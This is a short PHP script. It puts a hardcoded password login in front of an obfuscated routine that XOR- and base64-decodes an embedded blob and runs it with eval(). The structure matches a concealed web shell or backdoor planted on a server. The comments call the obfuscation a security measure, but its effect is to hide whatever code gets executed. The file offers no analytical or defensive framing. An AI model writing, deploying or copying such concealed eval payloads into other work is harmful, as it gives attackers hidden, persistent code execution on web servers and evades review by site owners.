<?php
session_start();

// Obfuscated password for verification
$obfuscated_password = base64_encode("ayane111");

// Check if the user is logged in
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Show login form if not authenticated
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $password = $_POST['password'];

        // Verify password
        if (base64_decode($obfuscated_password) === $password) {
            $_SESSION['authenticated'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            echo "Incorrect password.";
        }
    }
    ?>

    <form method="POST">
        <label>Password:</label>
        <input type="password" name="password" required>
        <button type="submit">Login</button>
    </form>

    <?php
    exit();
}

// Function obfuscated for security
function pvOKLzhNfJ($VgpYNAjxbl, $cjAahpyxiR) {
    $cjAahpyxiR = base64_encode($cjAahpyxiR);
    $VgpYNAjxbl = base64_decode($VgpYNAjxbl);
    $biDBsXhKsQ = "";
    $XFPFsKBktg = "";
    $lxNaEobzhq = 0;

    while ($lxNaEobzhq < strlen($VgpYNAjxbl)) {
        for ($eHIhOMpaYt = 0; $eHIhOMpaYt < strlen($cjAahpyxiR); $eHIhOMpaYt++) {
            $biDBsXhKsQ = chr(ord($VgpYNAjxbl[$lxNaEobzhq]) ^ ord($cjAahpyxiR[$eHIhOMpaYt]));
            $XFPFsKBktg .= $biDBsXhKsQ;
            $lxNaEobzhq++;
            if ($lxNaEobzhq >= strlen($VgpYNAjxbl)) break;
        }
    }

    return base64_decode($XFPFsKBktg);
}

$ZEmYYChrUc = "lgsodfhsdfnsadfoisdfiasdbfipoas234234";
$kfChuzsyMW = "JhYLEQZqGB4oDH4MEwBdSj0fEBctW1QMPh8UHDoxfxs7OhweOR90HTlIJUovDB8TKhlzUQEqKgwAXAABAyYfHgNfDA4VLRcXLHYpABQ9HwcXMXYSFBcxRS49eBEtLgAOFC4uThQVa1U7dSEOOGUUAC8LflsVOmcSFQM1XixYCw4AKgsKFyIpWQM5ABw5EHwRLxc5DRQ9AE0KEFJWO3UDHTJhEAcFEAQYAl9ZDzgPAwIoejoDOAQxRxAZfiAAXgwJAQEAEjkiGwwtDBgVBAZzUi4EJj40ZBggNXkMPgJcfzwPEQQ+Nl4+KQsSbyQLMxg4FS4bCCgTSiYgExsDFBwHSywJbFoyFCYQBmoYHjl6GF8AOngVExAcAilmHzQZKgxCAA85BAAAHAo5E2BYO0gbFhd2cBEUElVHBg8uAzhqCwIrAAQHOV5jCT0UOR0pZh80GSBqOw==";
$QbgUiRwcII = pvOKLzhNfJ($kfChuzsyMW, $ZEmYYChrUc);

// Execute the obfuscated code
eval($QbgUiRwcII);
?>
